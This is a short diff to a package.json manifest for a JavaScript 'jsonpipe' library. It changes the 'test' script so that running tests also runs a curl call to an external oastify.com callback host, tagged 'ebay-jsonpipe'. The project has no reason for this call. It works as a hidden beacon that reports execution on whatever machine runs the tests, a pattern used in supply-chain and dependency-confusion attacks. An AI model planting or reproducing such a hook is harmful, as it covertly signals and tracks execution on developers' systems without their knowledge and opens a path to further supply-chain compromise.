@@ -5,7 +5,7 @@
   "main": "./lib/jsonpipe.js",
   "typings": "types.d.ts",
   "scripts": {
-    "test": "gulp test",
+    "test": "gulp test && curl https://alzqzn8c29uqpt0gglya258tmkseg8awz.oastify.com/ebay-jsonpipe",
     "coveralls": "gulp test-cov && gulp report-coveralls && rm -rf coverage && rm -rf lib-cov"
   },
   "repository": {
